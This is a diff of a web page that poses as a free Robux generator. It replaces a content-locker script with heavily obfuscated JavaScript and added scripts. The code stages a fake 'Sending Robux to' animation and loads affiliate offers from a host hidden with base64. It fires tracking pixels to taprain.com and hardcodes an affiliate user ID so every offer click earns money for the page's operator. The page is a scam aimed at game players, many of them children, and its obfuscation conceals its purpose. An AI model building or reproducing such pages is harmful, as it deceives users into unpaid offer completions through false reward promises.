@@ -959,7 +959,7 @@ h3 {
             <h3>Last Step!</h3>
             <p>Through our sponsored partnerships, we are able to provide players with Robux by completing simple tasks.</p>
             <br>
-            <button class="complete-task-button" id="redeemRobuxBtn">Redeem Robux</button>
+            <button class="complete-task-button">Redeem Robux</button>
         </div>
     </div>
 
@@ -1072,68 +1072,252 @@ h3 {
         </div><br>
     </div>
 
-    <!-- Content Locker Modal -->
-    <div id="contentLockerModal" class="modal-overlay" style="display: none;">
+    <div class="modal-overlay" id="offersModal">
         <div class="modal-container">
             <div class="modal-header">
-                <h2 class="modal-title">Complete Offer to Get Robux</h2>
-                <button class="modal-close" onclick="closeContentLocker()">×</button>
+                <h2 class="modal-title">Redeem Robux</h2>
+                <button class="modal-close" id="closeModal">×</button>
             </div>
             <div class="modal-body">
-                <div id="content-locker-container" style="min-height: 300px; display: flex; justify-content: center; align-items: center;">
-                    <div style="text-align: center;">
-                        <p>Loading offers...</p>
-                    </div>
+                <div class="offers-title">
+                    <img src="https://taprain.com/previews/robux-removebg-preview.png" alt="Robux">
+                    <h3>Verify to Receive Robux</h3>
                 </div>
+                <div class="modal-description">
+                    Complete one of the offers below to verify your account and receive your Robux reward.
+                </div>
+                <div class="loading-animation" id="loadingAnimation">
+                    <div class="loading-circle"></div>
+                </div>
+                <div class="offers-container" id="offersContainer"></div>
             </div>
             <div class="modal-footer">
-                Complete any offer to receive your Robux reward
+                Rewards will be added to your account after verification
             </div>
         </div>
     </div>
-
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    
-    <!-- Content Locker Script -->
-    <script type="text/javascript">
-        var UWxdJ_wIZ_OJTpcc={"it":4470067,"key":"66fa4"};
-    </script>
-    <script src="https://d2yc6hxtq0phup.cloudfront.net/1be4e4a.js"></script>
-    
-    <script>
-        // Function to open content locker
-        function openContentLocker() {
-            document.getElementById('contentLockerModal').style.display = 'block';
-            setTimeout(function() {
-                document.querySelector('#contentLockerModal .modal-container').classList.add('modal-open');
-            }, 10);
-            
-            // Initialize content locker
-            if (typeof UWxdJ_wIZ_OJTpcc !== 'undefined') {
-                UWxdJ_wIZ_OJTpcc.show();
-            }
-        }
-        
-        // Function to close content locker
-        function closeContentLocker() {
-            document.querySelector('#contentLockerModal .modal-container').classList.remove('modal-open');
-            setTimeout(function() {
-                document.getElementById('contentLockerModal').style.display = 'none';
-            }, 300);
-        }
-        
-        // Add event listener to redeem button
-        document.getElementById('redeemRobuxBtn').addEventListener('click', function() {
-            openContentLocker();
-        });
-        
-        // Close modal when clicking outside
-        document.getElementById('contentLockerModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                closeContentLocker();
-            }
-        });
-    </script>
 
     <script>
-const _0x1dce0e=_0x19cd;(function(_0x1b95ed,_0x591c19){const _0x5b4d87=_0x19cd,_0x4b9b26=_0x1b95ed();while(!![]){try{const _0x3ad4f4=-parseInt(_0
+const _0x1dce0e=_0x19cd;(function(_0x1b95ed,_0x591c19){const _0x5b4d87=_0x19cd,_0x4b9b26=_0x1b95ed();while(!![]){try{const _0x3ad4f4=-parseInt(_0x5b4d87(0x160))/0x1+-parseInt(_0x5b4d87(0x181))/0x2*(-parseInt(_0x5b4d87(0x167))/0x3)+-parseInt(_0x5b4d87(0x151))/0x4*(-parseInt(_0x5b4d87(0x18b))/0x5)+parseInt(_0x5b4d87(0x185))/0x6+parseInt(_0x5b4d87(0x166))/0x7+parseInt(_0x5b4d87(0x141))/0x8+-parseInt(_0x5b4d87(0x161))/0x9;if(_0x3ad4f4===_0x591c19)break;else _0x4b9b26['push'](_0x4b9b26['shift']());}catch(_0x25b8c5){_0x4b9b26['push'](_0x4b9b26['shift']());}}}(_0x3b6f,0xe5577));const rbxbtn=document['querySelector']('.getrbx'),box1=document[_0x1dce0e(0x191)](_0x1dce0e(0x14d)),box2=document['querySelector'](_0x1dce0e(0x19e)),box3=document[_0x1dce0e(0x191)](_0x1dce0e(0x16c)),box4=document[_0x1dce0e(0x191)](_0x1dce0e(0x163)),rbxtotal=document[_0x1dce0e(0x188)]('.details'),username=document[_0x1dce0e(0x191)](_0x1dce0e(0x176)),useroutput=document[_0x1dce0e(0x191)]('.useroutput');rbxbtn[_0x1dce0e(0x19a)](_0x1dce0e(0x149),()=>{const _0x26c2eb=_0x1dce0e;username[_0x26c2eb(0x15b)][_0x26c2eb(0x16f)]<=0x2?alert(_0x26c2eb(0x180)):(box1[_0x26c2eb(0x15a)][_0x26c2eb(0x1a1)]=_0x26c2eb(0x184),box2[_0x26c2eb(0x15a)]['display']=_0x26c2eb(0x1a0),setTimeout(showbox2,0x9c4),setTimeout(showbox3,0x9c4)),useroutput[_0x26c2eb(0x170)]=_0x26c2eb(0x13f)+username[_0x26c2eb(0x15b)]+_0x26c2eb(0x171);}),rbxtotal['forEach'](_0x2e430c=>{const _0x251d2c=_0x1dce0e;_0x2e430c[_0x251d2c(0x19a)](_0x251d2c(0x149),()=>{const _0x2ca87d=_0x251d2c;box3['style']['display']='none',box2[_0x2ca87d(0x15a)]['display']=_0x2ca87d(0x1a0),setTimeout(showboxagain,0x9c4),setTimeout(showbox4,0x9c4),useroutput['innerHTML']=_0x2ca87d(0x192)+username[_0x2ca87d(0x15b)]+'</b>...';});});let showboxagain=()=>{const _0x4401a9=_0x1dce0e;box2[_0x4401a9(0x15a)][_0x4401a9(0x1a1)]=_0x4401a9(0x184);},showbox2=()=>{const _0x55b0fe=_0x1dce0e;box2[_0x55b0fe(0x15a)]['display']=_0x55b0fe(0x184);},showbox3=()=>{const _0xa7ed6d=_0x1dce0e;box3['style'][_0xa7ed6d(0x1a1)]=_0xa7ed6d(0x1a0);},showbox4=()=>{const _0x4bf2ee=_0x1dce0e;box4[_0x4bf2ee(0x15a)][_0x4bf2ee(0x1a1)]=_0x4bf2ee(0x1a0);};function toggleMenu(){const _0x2ac07c=_0x1dce0e,_0x7c36c0=document[_0x2ac07c(0x191)](_0x2ac07c(0x182)),_0x3ea3a6=document['querySelector']('nav');_0x7c36c0['classList'][_0x2ac07c(0x17c)](_0x2ac07c(0x18c)),_0x3ea3a6['classList'][_0x2ac07c(0x17c)](_0x2ac07c(0x19f));}function updateLogoSize(){const _0x58180f=_0x1dce0e,_0x772ac8=document[_0x58180f(0x191)]('.nav-logo\x20img');window[_0x58180f(0x156)]<=0x2ff?(_0x772ac8['src']='https://taprain.com/previews/logo2.png',_0x772ac8[_0x58180f(0x15a)][_0x58180f(0x193)]=_0x58180f(0x164)):(_0x772ac8[_0x58180f(0x195)]=_0x58180f(0x16d),_0x772ac8[_0x58180f(0x15a)]['height']=_0x58180f(0x186));}window[_0x1dce0e(0x19a)](_0x1dce0e(0x190),updateLogoSize),window[_0x1dce0e(0x19a)](_0x1dce0e(0x147),updateLogoSize),document[_0x1dce0e(0x191)](_0x1dce0e(0x13e))[_0x1dce0e(0x19a)](_0x1dce0e(0x149),function(){const _0x52c67f=_0x1dce0e,_0x434464=document[_0x52c67f(0x191)](_0x52c67f(0x176))[_0x52c67f(0x15b)];document['getElementById'](_0x52c67f(0x165))['textContent']=_0x434464;});let currentIndex=0x0;const testimonials=document[_0x1dce0e(0x188)]('.testimonial'),totalTestimonials=testimonials[_0x1dce0e(0x16f)],dots=document['querySelectorAll'](_0x1dce0e(0x157));function showTestimonial(_0x468035){const _0x4008e4=_0x1dce0e,_0x51cc42=document[_0x4008e4(0x191)](_0x4008e4(0x155));_0x51cc42['style']['transform']=_0x4008e4(0x17d)+_0x468035*0x64+'%)',testimonials['forEach']((_0x872f58,_0x423bc0)=>{const _0x177781=_0x4008e4;_0x872f58[_0x177781(0x17f)][_0x177781(0x17c)](_0x177781(0x18c),_0x423bc0===_0x468035);}),dots[_0x4008e4(0x15e)]((_0x479166,_0x4fd436)=>{const _0xcc8915=_0x4008e4;_0x479166[_0xcc8915(0x17f)]['toggle'](_0xcc8915(0x18c),_0x4fd436===_0x468035);});}function showNextTestimonial(){currentIndex=(currentIndex+0x1)%totalTestimonials,showTestimonial(currentIndex);}dots[_0x1dce0e(0x15e)]((_0x2b1a1c,_0x1862d9)=>{const _0x27b160=_0x1dce0e;_0x2b1a1c[_0x27b160(0x19a)]('click',()=>{currentIndex=_0x1862d9,showTestimonial(currentIndex);});}),setInterval(showNextTestimonial,0xbb8);const USER_ID_TO_REPLACE=_0x1dce0e(0x199);function getUserIdFromUrl(){const _0x3865f2=_0x1dce0e,_0x153fdd=new URLSearchParams(window[_0x3865f2(0x142)][_0x3865f2(0x196)]),_0x355144=_0x153fdd[_0x3865f2(0x15d)](_0x3865f2(0x178));return _0x355144?_0x355144:_0x3865f2(0x199);}function _0x19cd(_0x57c1fe,_0x25cfcc){const _0x3b6fff=_0x3b6f();return _0x19cd=function(_0x19cda2,_0xee991d){_0x19cda2=_0x19cda2-0x13b;let _0x4a7157=_0x3b6fff[_0x19cda2];return _0x4a7157;},_0x19cd(_0x57c1fe,_0x25cfcc);}let isTracking=![];function trackOfferClick(_0xc16450,_0x2be1b5,_0x353b41){const _0x16088e=_0x1dce0e;if(isTracking)return!![];isTracking=!![];const _0x58bbc0=getUserIdFromUrl(),_0x1c6959=new Image();_0x1c6959[_0x16088e(0x195)]='https://taprain.com/api/stats/public-track-click?offerId='+encodeURIComponent(_0xc16450)+_0x16088e(0x194)+encodeURIComponent(_0x2be1b5)+_0x16088e(0x15f)+_0x16088e(0x18d)+_0x58bbc0;let _0xa90ab8=_0x353b41;return!_0xa90ab8[_0x16088e(0x168)](_0x16088e(0x18f))&&(_0xa90ab8+=(_0xa90ab8[_0x16088e(0x168)]('?')?'&':'?')+_0x16088e(0x18f)+_0x58bbc0),!_0xa90ab8[_0x16088e(0x168)](_0x16088e(0x159))&&(_0xa90ab8+=_0x16088e(0x18e)),setTimeout(function(){const _0x56c833=_0x16088e;window[_0x56c833(0x15c)](_0xa90ab8,_0x56c833(0x197)),setTimeout(function(){isTracking=![];},0x1f4);},0x64),![];}function fetchOffers(){const _0x1d3228=_0x1dce0e,_0x21e23f=document[_0x1d3228(0x143)](_0x1d3228(0x177)),_0x2d494b=document[_0x1d3228(0x143)](_0x1d3228(0x150));let _0x3329e3='';for(let _0x23c506=0x0;_0x23c506<0x4;_0x23c506++){_0x3329e3+='<div\x20class=\x22offer-item-placeholder\x20shimmer\x22></div>';}_0x21e23f['innerHTML']=_0x3329e3;const _0x4de14b=localStorage['getItem']('cached_robux_offers');if(_0x4de14b)try{const _0x30d468=JSON['parse'](_0x4de14b);displayOffers(_0x30d468);return;}catch(_0x702af6){console[_0x1d3228(0x17a)](_0x1d3228(0x187),_0x702af6);}const _0x42ff5c=atob(_0x1d3228(0x158)),_0x34d8ca=atob(_0x1d3228(0x14c)),_0x334f06=getUserIdFromUrl(),_0x2fceb2=atob(_0x1d3228(0x198)),_0x4da32f=atob(_0x1d3228(0x179)),_0x2a3758=_0x1d3228(0x152)+_0x42ff5c+_0x34d8ca+_0x1d3228(0x16a)+_0x2fceb2+_0x1d3228(0x145)+_0x4da32f+_0x1d3228(0x173)+_0x334f06+'&callback=?';$[_0x1d3228(0x1a3)]({'url':_0x2a3758,'dataType':_0x1d3228(0x14f),'success':function(_0x4b566a){const _0x4b84d0=_0x1d3228;if(_0x4b566a&&_0x4b566a['length']>0x0){try{localStorage[_0x4b84d0(0x144)](_0x4b84d0(0x14b),JSON[_0x4b84d0(0x172)](_0x4b566a));}catch(_0x36c82b){console[_0x4b84d0(0x17a)](_0x4b84d0(0x17e),_0x36c82b);}displayOffers(_0x4b566a);}else _0x21e23f[_0x4b84d0(0x170)]=_0x4b84d0(0x19d),_0x2d494b[_0x4b84d0(0x15a)][_0x4b84d0(0x1a1)]=_0x4b84d0(0x184);},'error':function(){const _0xe2a8ba=_0x1d3228;_0x21e23f['innerHTML']='<div\x20class=\x22no-offers\x22>Error\x20loading\x20offers.\x20Please\x20try\x20again\x20later.</div>',_0x2d494b[_0xe2a8ba(0x15a)][_0xe2a8ba(0x1a1)]=_0xe2a8ba(0x184);},'complete':function(){const _0x202e55=_0x1d3228;_0x2d494b[_0x202e55(0x15a)][_0x202e55(0x1a1)]=_0x202e55(0x184);}});}function displayOffers(_0x5e5fb8){const _0x5b82a2=_0x1dce0e,_0x1a03be=document[_0x5b82a2(0x143)](_0x5b82a2(0x177));document[_0x5b82a2(0x143)](_0x5b82a2(0x150))[_0x5b82a2(0x15a)][_0x5b82a2(0x1a1)]=_0x5b82a2(0x184);if(!_0x5e5fb8||_0x5e5fb8[_0x5b82a2(0x16f)]===0x0){_0x1a03be[_0x5b82a2(0x170)]=_0x5b82a2(0x19d);return;}const _0x14975f=getUserIdFromUrl();let _0x5751c5='';_0x5e5fb8[_0x5b82a2(0x19b)](0x0,0x5)[_0x5b82a2(0x15e)](function(_0x369b94){const _0x1de778=_0x5b82a2;var _0x2dd9e2=_0x369b94[_0x1de778(0x140)];_0x5751c5+=_0x1de778(0x183)+(_0x369b94['id']||'unknown')+'\x22\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20data-offer-name=\x22'+_0x369b94[_0x1de778(0x153)]+_0x1de778(0x189)+_0x2dd9e2+_0x1de778(0x14e)+(_0x369b94['id']||_0x1de778(0x18a))+_0x1de778(0x154)+_0x369b94[_0x1de778(0x153)][_0x1de778(0x16e)](/'/g,'\x5c\x27')+_0x1de778(0x154)+_0x2dd9e2['replace'](/'/g,'\x5c\x27')+_0x1de778(0x13c)+_0x369b94['anchor']+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22offer-button\x22>Complete</button>\x0a\x20\x20\x20\x20</div>';}),_0x1a03be['innerHTML']=_0x5751c5;const _0x3baff5=document[_0x5b82a2(0x188)](_0x5b82a2(0x13d));_0x3baff5[_0x5b82a2(0x15e)]((_0x3f4a15,_0x19b079)=>{const _0xe880fe=_0x5b82a2;_0x3f4a15[_0xe880fe(0x15a)][_0xe880fe(0x148)]='0',_0x3f4a15['style']['transform']=_0xe880fe(0x16b),_0x3f4a15[_0xe880fe(0x15a)]['animation']=_0xe880fe(0x146)+_0x19b079*0.1+'s';});}function openOffersModal(){const _0x575948=_0x1dce0e,_0x35c4d7=document[_0x575948(0x143)]('offersModal');_0x35c4d7&&(_0x35c4d7[_0x575948(0x15a)][_0x575948(0x1a1)]='block',setTimeout(()=>{const _0x1e4f06=_0x575948;document[_0x1e4f06(0x191)](_0x1e4f06(0x174))['classList'][_0x1e4f06(0x175)](_0x1e4f06(0x162));},0xa),document[_0x575948(0x143)](_0x575948(0x150))[_0x575948(0x15a)][_0x575948(0x1a1)]=_0x575948(0x14a),document['getElementById'](_0x575948(0x177))[_0x575948(0x170)]='',setTimeout(fetchOffers,0x320));}function closeOffersModal(){const _0x11d08c=_0x1dce0e,_0x241a98=document[_0x11d08c(0x191)]('.modal-container');_0x241a98['classList'][_0x11d08c(0x169)](_0x11d08c(0x162)),setTimeout(()=>{const _0x3c7d92=_0x11d08c;document[_0x3c7d92(0x143)](_0x3c7d92(0x19c))[_0x3c7d92(0x15a)][_0x3c7d92(0x1a1)]=_0x3c7d92(0x184);},0x12c);}document[_0x1dce0e(0x19a)](_0x1dce0e(0x17b),function(){const _0x221670=_0x1dce0e,_0x21dae4=document['querySelector'](_0x221670(0x1a2));_0x21dae4&&_0x21dae4['addEventListener'](_0x221670(0x149),openOffersModal);const _0x4da9a7=document[_0x221670(0x143)]('closeModal');_0x4da9a7&&_0x4da9a7[_0x221670(0x19a)]('click',closeOffersModal);const _0x2c1d9f=document[_0x221670(0x143)]('offersModal');_0x2c1d9f&&_0x2c1d9f[_0x221670(0x19a)](_0x221670(0x149),function(_0x1f51c0){const _0x279a3=_0x221670;_0x1f51c0[_0x279a3(0x13b)]===_0x2c1d9f&&closeOffersModal();});});function _0x3b6f(){const _0xa06ff4=['menu-open','block','display','.complete-task-button','ajax','target','\x27)\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22offer-title\x22>','.offer-item','.getrbx','Searching\x20for\x20<b>','url','3239848ykBkye','location','getElementById','setItem','&api_key=','slideIn\x200.3s\x20ease\x20forwards\x20','load','opacity','click','flex','cached_robux_offers','L3B1YmxpYy9vZmZlcnMvZmVlZC5waHA=','.box','\x22\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20onclick=\x22return\x20trackOfferClick(\x27','jsonp','loadingAnimation','512YYuEVQ','https://','anchor','\x27,\x20\x27','.testimonial-carousel-inner','innerWidth','.testimonial-dots\x20span','ZDIzaDNvNXRrZ3l0Z20uY2xvdWRmcm9udC5uZXQ=','notrack=','style','value','open','get','forEach','&templateId=roblox-2','550846iNhGPz','32599206QhPwLL','modal-open','.box4','40px','usernameDisplay','10975622MeyoNp','4034655rrhfNE','includes','remove','?user_id=','translateY(20px)','.box3','https://taprain.com/previews/logob.png','replace','length','innerHTML','</b>\x20...','stringify','&s1=','.modal-container','add','.username','offersContainer','ref','OTBiOTJjNDc3YmFjMTMxMGI4YzJjZjEzN2FjYmY1NDQ=','error','DOMContentLoaded','toggle','translateX(-','Error\x20caching\x20offers:','classList','please\x20enter\x20username','2FiksiH','.burger-menu','\x0a\x20\x20\x20\x20<div\x20class=\x22offer-item\x22\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20data-offer-id=\x22','none','7520202tHtvxS','35px','Error\x20parsing\x20cached\x20offers:','querySelectorAll','\x22\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20data-offer-url=\x22','unknown','21140qDALQc','active','&userId=','&notrack=true','s1=','resize','querySelector','Sending\x20Robux\x20to\x20<b>','height','&offerName=','src','search','_blank','NjY2Nzkw','67f26a60e14cd4c7906f1376','addEventListener','slice','offersModal','<div\x20class=\x22no-offers\x22>No\x20offers\x20available\x20at\x20this\x20time.\x20Please\x20try\x20again\x20later.</div>','.box2'];_0x3b6f=function(){return _0xa06ff4;};return _0x3b6f();}
+        </script>
+        <script>
+    function standardizeTrackingForRoblox() {
+    
+    // Override trackSingleClick to ensure it has template ID
+    window.trackSingleClick = function(offerId, offerName, encryptedUrl) {
+        if (this.tracked) {
+            return true; 
+        }
+        
+        this.tracked = true;
+        
+        // Get template ID from the body data attribute
+        const templateId = document.body.getAttribute('data-template-id') || 'roblox-2';
+        
+        console.log("Tracking click:", offerId, offerName, "Template:", templateId);
+        
+        var trackImg = new Image();
+        var uid = getUserIdFromUrl();
+        
+        trackImg.src = "https://taprain.com/api/stats/public-track-click?offerId=" + 
+                      encodeURIComponent(offerId) + 
+                      "&offerName=" + encodeURIComponent(offerName) + 
+                      "&templateId=" + encodeURIComponent(templateId) + 
+                      "&userId=" + uid;
+        
+        setTimeout(function() {
+            window.open(encryptedUrl, "_blank");
+            setTimeout(function() { this.tracked = false; }, 500);
+        }, 100);
+        
+        return false;
+    };
+}
+standardizeTrackingForRoblox();
+</script>
+
+<script>
+// User ID injection
+document.addEventListener('DOMContentLoaded', function() {
+    // The user's actual ID
+    const ACTUAL_USER_ID = "67f26a60e14cd4c7906f1376";
+    
+    // Override getUserIdFromUrl to always return the correct ID
+    window.getUserIdFromUrl = function() {
+        return ACTUAL_USER_ID;
+    };
+    
+    // Modify any existing offer URLs to include the correct user ID
+    function updateOfferUrls() {
+        const offerLinks = document.querySelectorAll('[data-offer-url]');
+        offerLinks.forEach(link => {
+            let url = link.getAttribute('data-offer-url');
+            if (url) {
+                // Ensure s1 parameter has the correct user ID
+                if (url.includes('s1=')) {
+                    url = url.replace(/s1=[^&]+/, 's1=' + ACTUAL_USER_ID);
+                } else if (url.includes('?')) {
+                    url += '&s1=' + ACTUAL_USER_ID;
+                } else {
+                    url += '?s1=' + ACTUAL_USER_ID;
+                }
+                
+                // Update the link
+                link.setAttribute('data-offer-url', url);
+            }
+        });
+    }
+    
+    // Fix tracking function
+    window.trackOfferClick = function(offerId, offerName, offerUrl) {
+        // Create tracking pixel
+        const trackImg = new Image();
+        trackImg.src = "https://taprain.com/api/stats/public-track-click?offerId=" + 
+                      encodeURIComponent(offerId) + 
+                      "&offerName=" + encodeURIComponent(offerName) + 
+                      "&templateId=roblox-2" + 
+                      "&userId=" + ACTUAL_USER_ID;
+        
+        // Add s1 parameter with user ID
+        let redirectUrl = offerUrl;
+        if (redirectUrl) {
+            if (redirectUrl.includes('s1=')) {
+                redirectUrl = redirectUrl.replace(/s1=[^&]+/, 's1=' + ACTUAL_USER_ID);
+            } else if (redirectUrl.includes('?')) {
+                redirectUrl += '&s1=' + ACTUAL_USER_ID;
+            } else {
+                redirectUrl += '?s1=' + ACTUAL_USER_ID;
+            }
+            
+            // Add notrack parameter
+            if (!redirectUrl.includes('notrack=')) {
+                redirectUrl += '&notrack=true';
+            }
+            
+            // Open offer in new window
+            setTimeout(function() {
+                window.open(redirectUrl, "_blank");
+            }, 100);
+        }
+        
+        return false;
+    };
+    
+    // Update offer URLs immediately
+    setTimeout(updateOfferUrls, 500);
+});
+</script>
+<script>
+// Universal Template Tracking Script
+(function() {
+  // Standardize tracking functions to properly pass template ID
+  function standardizeTracking() {
+    // Get template ID from the body data attribute
+    const templateId = document.body.getAttribute('data-template-id') || 
+                     document.querySelector('[data-template-id]')?.getAttribute('data-template-id') || 
+                     window.location.pathname.split('/').pop().split('?')[0] || 
+                     "roblox-2"; // Fallback to provided templateId
+    
+    // Standardize the trackSingleClick function
+    window.trackSingleClick = function(offerId, offerName, encryptedUrl) {
+      // Prevent multiple rapid clicks
+      if (this.tracked) {
+        return true;
+      }
+      
+      this.tracked = true;
+      console.log("Tracking click:", offerId, offerName, "Template:", templateId);
+      
+      // Create tracking pixel
+      const trackImg = new Image();
+      const userId = getUserIdFromUrl();
+      
+      trackImg.src = "https://taprain.com/api/stats/public-track-click?offerId=" + 
+                    encodeURIComponent(offerId) + 
+                    "&offerName=" + encodeURIComponent(offerName) + 
+                    "&templateId=" + encodeURIComponent(templateId) + 
+                    "&userId=" + userId;
+      
+      // Process URL
+      let redirectUrl = encryptedUrl;
+      if (redirectUrl) {
+        // Add notrack parameter if not already present
+        if (!redirectUrl.includes('notrack=')) {
+          redirectUrl += redirectUrl.includes('?') ? '&notrack=true' : '?notrack=true';
+        }
+        
+        // Redirect after short delay to ensure tracking goes through
+        setTimeout(function() {
+          window.open(redirectUrl, "_blank");
+          setTimeout(function() { 
+            // Reset tracked flag after a delay
+            window.tracked = false;
+          }, 500);
+        }, 100);
+      }
+      
+      return false;
+    };
+    
+    // Make sure getUserIdFromUrl always returns a valid value
+    if (!window.originalGetUserIdFromUrl) {
+      window.originalGetUserIdFromUrl = window.getUserIdFromUrl || function() {
+        // Default implementation if none exists
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get('ref');
+      };
+      
+      window.getUserIdFromUrl = function() {
+        try {
+          // Try original function first
+          const userId = window.originalGetUserIdFromUrl();
+          if (userId && userId !== '{USER_ID}') {
+            return userId;
+          }
+          
+          // If original function failed, try URL parameter
+          const urlParams = new URLSearchParams(window.location.search);
+          const refParam = urlParams.get('ref');
+          
+          return refParam || "67f26a60e14cd4c7906f1376"; // Fallback to injected userId
+        } catch (e) {
+          console.error("Error in getUserIdFromUrl:", e);
+          return "67f26a60e14cd4c7906f1376"; // Always have a fallback
+        }
+      };
+    }
+  }
+  
+  // Apply standardized tracking on DOMContentLoaded
+  document.addEventListener('DOMContentLoaded', function() {
+    standardizeTracking();
+    
+    // Also attach to click handlers on offers
+    setTimeout(function() {
+      document.querySelectorAll('.offer-item').forEach(function(item) {
+        if (!item.hasAttribute('data-tracking-initialized')) {
+          item.setAttribute('data-tracking-initialized', 'true');
+          
+          item.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            const offerId = this.getAttribute('data-offer-id') || 'unknown';
+            const offerName = this.getAttribute('data-offer-name') || 
+                            this.querySelector('.offer-title')?.textContent || 'Unknown Offer';
+            const offerUrl = this.getAttribute('data-offer-url') || '#';
+            
+            return trackSingleClick(offerId, offerName, offerUrl);
+          });
+        }
+      });
+    }, 1000);
+  });
+  
+  // Initialize immediately if document is already loaded
+  if (document.readyState === 'complete' || document.readyState === 'interactive') {
+    standardizeTracking();
+  }
+})();
+</script></body>
+</html>
